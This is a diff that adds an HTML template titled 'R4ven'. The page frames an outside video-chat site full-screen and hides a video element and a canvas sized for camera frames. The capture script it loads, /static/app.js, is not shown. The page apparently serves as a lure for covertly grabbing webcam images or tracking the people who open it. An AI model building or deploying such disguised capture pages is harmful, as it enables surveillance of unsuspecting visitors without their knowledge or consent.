@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>R4ven</title>
+</head>
+
+<body>
+  <script>
+    var userChoice = "{{ choice }}";
+  </script>
+
+  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
+  </iframe>
+
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="/static/app.js"></script>
+</body>
+
+</html>
